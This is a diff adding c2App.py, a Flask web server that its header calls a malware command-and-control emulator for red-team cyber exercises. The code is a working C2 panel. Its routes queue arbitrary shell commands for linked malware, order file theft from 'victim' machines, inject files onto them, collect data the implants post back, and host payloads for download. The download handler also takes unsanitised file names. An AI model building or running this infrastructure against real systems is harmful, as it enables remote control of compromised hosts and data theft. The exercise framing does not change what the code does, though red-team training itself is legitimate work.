@@ -1,0 +1,297 @@
+#!/usr/bin/python
+#-----------------------------------------------------------------------------
+# Name:        c2App.py [python3]
+#
+# Purpose:     This module is used as a malicious action program / malware command 
+#              and control emulator for red team to monitor & control all the linked
+#              malwares to carry out cyberattacks on their chosen targets. 
+#  
+# Author:      Yuancheng Liu
+#
+# Created:     2022/08/13
+# version:     v0.2.2
+# Copyright:   Copyright (c) 2022 LiuYuancheng
+# License:     MIT License
+#-----------------------------------------------------------------------------
+""" Design Purpose: 
+    We want to design a C2 malware management system which can be applyed for the 
+    cyber execise used by red team: 
+    - CIDEX2022
+    - LS2023
+    - XS2023
+
+    All the malicious action program / malware will report C2 via http / https, it 
+    will provide the web interface or API for red team users / program to do the 
+    control of the linked malwares. For automated executing the malware action timeline, 
+    if you don't want to hard code the timeline in the malware, you can : 
+        1. Set the malware task config json file and upload to C2, then the C2 will 
+            auto-assign the tasks to the malware. 
+        2.  Use one User Emulator to simulate a hacker's attack time line action by calling
+            the related C2's API to dynamically control the related malware. 
+
+    Reference: 
+    - User Emulator: https://github.com/LiuYuancheng/Windows_User_Simulator
+    - CSS lib [bootstrap]: https://www.w3schools.com/bootstrap4/default.asp
+    - https://www.w3schools.com/howto/howto_css_form_on_image.asp
+"""
+
+import os
+from datetime import timedelta, datetime
+from flask import Flask, \
+    request, \
+    flash, render_template, send_from_directory, url_for, redirect, jsonify
+from werkzeug.utils import secure_filename
+from flask_socketio import SocketIO, emit 
+
+import c2HubGlobal as gv
+import c2DataManager
+import c2MwUtils
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+def InitDataMgr():
+    gv.iDataMgr = c2DataManager.DataManager(None)
+    gv.gDebugPrint("C2 App Test mode : %s " %str(gv.gTestMd), logType=gv.LOG_INFO)
+    if gv.gTestMd:
+        gv.iDataMgr.addMalware('testMalware0', '127.0.0.1', 
+                            taskList=[{ 'taskID': 0,
+                                        'taskType': c2MwUtils.RIG_FLG,
+                                        'startT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                                        'repeat': 1,
+                                        'exePreT': 0,
+                                        'state': c2MwUtils.TASK_F_FLG,
+                                        'taskData': None}])
+    # Check the file storage folder.
+    if not os.path.isdir(gv.UPLOAD_FOLDER): os.mkdir(gv.UPLOAD_FOLDER)
+    if not os.path.isdir(gv.DOWNLOAD_FOLDER): os.mkdir(gv.DOWNLOAD_FOLDER)
+
+def getC2FilesList():
+    return os.listdir(app.config['DOWNLOAD_FOLDER'])
+
+#-----------------------------------------------------------------------------
+# Init the flask web app program.
+def createApp():
+    """ Create the flask App and init the app config parameters."""
+    app = Flask(__name__)
+    app.config['SECRET_KEY'] = gv.APP_SEC_KEY
+    app.config['REMEMBER_COOKIE_DURATION'] = timedelta(seconds=gv.COOKIE_TIME)
+    app.config['UPLOAD_FOLDER'] = gv.UPLOAD_FOLDER
+    app.config['DOWNLOAD_FOLDER'] = gv.DOWNLOAD_FOLDER
+    # limit the max upload file size to 16MB
+    app.config['MAX_CONTENT_LENGTH'] = 16 * 1000 * 1000
+    return app
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+InitDataMgr()
+app = createApp()
+async_mode = None # Socket IO async mode off 
+socketio = SocketIO(app, async_mode=async_mode)
+gv.iSocketIO = socketio
+
+#-----------------------------------------------------------------------------
+# defind all the web request handling functions. 
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+#-----------------------------------------------------------------------------
+@app.route('/malwaremgmt')
+def malwaremgmt():
+    malwaresSum = gv.iDataMgr.getMalwaresInfo()
+    gv.gDebugPrint("Receive the peer Info %s" %str(malwaresSum), logType=gv.LOG_INFO)
+    fileList = getC2FilesList()
+    return render_template('malwaremgmt.html', posts=malwaresSum, files=fileList)
+
+#-----------------------------------------------------------------------------
+@app.route('/<int:postID>')
+def peerstate(postID):
+    peerInfoDict = gv.iDataMgr.buildPeerInfoDict(postID)
+    fileList = getC2FilesList()
+    return render_template('peerstate.html',posts=peerInfoDict, files=fileList)
+ 
+#-----------------------------------------------------------------------------
+# defind all the HTTP GET/POST API. 
+@app.route('/fileupload', methods = ['POST', 'GET'])  
+def fileupload():
+    """ Handle program file upload POST request.
+        API call example:
+        requests.post(http://<ip>:<port>/fileupload, files= {'file': (<filename>, fh.read())})
+    """
+    uploadRst = {'uploaded': False, 'errorcode': 0}
+    if request.method == 'POST':
+        if 'file' in request.files:
+            fileObj = request.files['file']
+            if fileObj.filename:
+                gv.gDebugPrint("File %s is uploaded via POST API." %str(fileObj.filename), logType=gv.LOG_INFO)
+                filename = secure_filename(fileObj.filename)
+                fileObj.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
+                uploadRst['uploaded'] = True
+                return jsonify(uploadRst)
+            else:
+                uploadRst['errorcode'] = 1
+                gv.gDebugPrint("Upload filename missing, filename:%s" %str(fileObj.filename), logType=gv.LOG_INFO)
+        uploadRst['errorcode'] = 2
+    return jsonify(uploadRst)
+
+#-----------------------------------------------------------------------------
+@app.route('/webfileupload', methods = ['POST',])
+def webfileupload():
+    """ Handle file upload from web UI."""
+    result = fileupload()
+    flash('File uploaded', 'info')
+    return redirect(url_for('malwaremgmt'))
+
+#-----------------------------------------------------------------------------
+@app.route('/filedownload', methods = ['POST', 'GET'])  
+def filedownload():
+    """ Handle program file download GET request.
+        API call example:
+        requests.get(http://<ip>:<port>/filedownload, json={"filename": filename}, allow_redirects=True)
+    """
+    if request.method == 'GET':
+        content = request.json
+        filename = content['filename']
+        filePath = os.path.join(app.config["DOWNLOAD_FOLDER"], filename)
+        if filename and os.path.exists(filePath):
+            gv.gDebugPrint(" File %s is downlaod via API." %str(filePath), logType=gv.LOG_INFO)
+            return send_from_directory(app.config["DOWNLOAD_FOLDER"], filename)
+        else:
+            gv.gDebugPrint("Download file not exist %s" %str(filePath), logType=gv.LOG_INFO)
+            return "File not exist", 400 # return 400 bad request error.
+
+#-----------------------------------------------------------------------------
+@app.route('/webfiledownload', methods = ['POST','GET']) 
+def webfiledownload():
+    """ Handle file download request from web UI.
+        API call example:
+        requests.get(http://<ip>:<port>/webfiledownload/<filename>, allow_redirects=True)
+    """
+    filename = request.form.get("downloadfilename")
+    filePath = os.path.join(app.config["DOWNLOAD_FOLDER"], filename)
+    if filename and os.path.exists(filePath):
+        gv.gDebugPrint(" File %s is downlaod via API." %str(filePath), logType=gv.LOG_INFO)
+        flash('File downloaded', 'info')
+        return send_from_directory(app.config["DOWNLOAD_FOLDER"], filename)
+    return redirect(url_for('malwaremgmt'))
+
+#-----------------------------------------------------------------------------
+@app.route('/dataPost/<string:peerName>', methods=('POST',))
+def dataPost(peerName):
+    """ Handle program data submittion request.
+        API call example:
+        requests.post(http://%s:%s/dataPost/<peerID>, json={})
+    """
+    content = request.json
+    gv.gDebugPrint("Get raw data from %s " %str(peerName), logType=gv.LOG_INFO)
+    gv.gDebugPrint("Raw Data: %s" % str(content),prt=True, logType=gv.LOG_INFO)
+    result = gv.iDataMgr.handleRequest(content) if gv.iDataMgr else {"ok": True}
+    return jsonify(result)
+
+#-----------------------------------------------------------------------------
+@app.route('/taskPost', methods=['POST', ])
+def taskPost():
+    """ Handle add task to specific malware via http POST API.
+        API call example :
+        requests.post(http://%s:%s/taskPost, json={'id':<malwareID>, ...})
+    """
+    content = request.json
+    gv.gDebugPrint("Raw Data: %s" % str(content),prt=True, logType=gv.LOG_INFO)
+    if content:
+        content = dict(content)
+        mwId = str(content['id'])
+        #rst = gv.iDataMgr.addTaskToMalware(idx, content)
+        rst = gv.iDataMgr.addTaskToRcdDict(mwId, content)
+        gv.gDebugPrint("API add task result : %s " %str(rst))
+    return jsonify({"taskPost": rst})
+
+#-----------------------------------------------------------------------------
+@app.route('/getLastRst', methods=['GET', ])
+def getLastRst():
+    """ Handle get the malware last task result request vai http GET API. 
+        API call example :
+        requests.get(http://%s:%s/getLastRst, json={'id':<malwareID>})
+    """
+    content = request.json
+    gv.gDebugPrint("Raw Data: %s" % str(content),prt=True, logType=gv.LOG_INFO)
+    if content:
+        content = dict(content)
+        mwId = str(content['id'])
+        rst = gv.iDataMgr.getMwLastTaskRst(mwId)
+    return jsonify({"taskRst": rst['taskData']})
+
+#-----------------------------------------------------------------------------
+@app.route('/addcommand', methods=['POST', ])
+def addcommand():
+    """ Handle assign run command task to malware task config from web UI. """
+    idx = int(request.form['malwareidx'])
+    taskJson = {
+        'taskType': c2MwUtils.CMD_FLG,
+        'taskData': [request.form['commandstr']]
+    }
+    rst = gv.iDataMgr.addTaskToMalware(idx, taskJson)
+    gv.gDebugPrint("Web-UI Add cmd task result : %s " %str(rst))
+    return redirect(url_for('peerstate', postID=idx))
+
+#-----------------------------------------------------------------------------
+@app.route('/addfilecopy', methods=['POST', ])
+def addfilecopy():
+    """ Handle steal file from victim task to malware task config from web UI. """
+    idx = int(request.form['malwareidx'])
+    taskJson = {
+        'taskType': c2MwUtils.UPLOAD_FLG,
+        'taskData': [request.form['filepath']]
+    }
+    rst = gv.iDataMgr.addTaskToMalware(idx, taskJson)
+    gv.gDebugPrint("Web-UI Add upload task result : %s " %str(rst))
+    return redirect(url_for('peerstate', postID=idx))
+
+#-----------------------------------------------------------------------------
+@app.route('/addfileinject', methods=['POST', ])
+def addfileinject():
+    """ Handle inject file to victim task to malware task config from web UI. """
+    idx = int(request.form['malwareidx'])
+    filename = request.form.get("downloadfilename")
+    filePath = os.path.join(app.config["DOWNLOAD_FOLDER"], filename)
+    if filename and os.path.exists(filePath):
+        taskJson = {
+            'taskType': c2MwUtils.DOWNLOAD_FLG,
+            'taskData': [filename]
+        }
+        rst = gv.iDataMgr.addTaskToMalware(idx, taskJson)
+        gv.gDebugPrint("Web-UI Add file inject task result : %s " %str(rst))
+    else:
+        gv.gDebugPrint("File not found : %s " %str(filePath))
+    return redirect(url_for('peerstate', postID=idx))
+
+#-----------------------------------------------------------------------------
+@app.route('/addspecialtask', methods=['POST',])
+def addspecialtask():
+    """ Handle add special task from web UI. """
+    idx = int(request.form['malwareidx'])
+    taskType = request.form.get("tasktype")
+    repeat = request.form.get("repeat")
+    taskdata = request.form.get("taskdata")
+    taskJson = {
+        'taskType': taskType,
+        'repeat': int(repeat),
+        'taskData': taskdata
+    }
+    rst = gv.iDataMgr.addTaskToMalware(idx, taskJson)
+    gv.gDebugPrint("Web-UI Add spical task result : %s " %str(rst))
+    return redirect(url_for('peerstate', postID=idx))
+
+#-----------------------------------------------------------------------------
+# socketIO communication handling functions. 
+@socketio.event
+def connect():
+    print("One client connected")
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+if __name__ == '__main__':
+    app.run(host=gv.gflaskHost,
+            port=gv.gflaskPort,
+            debug=gv.gflaskDebug,
+            threaded=gv.gflaskMultiTH,
+            ssl_context=gv.ghttpsCertsInfo)
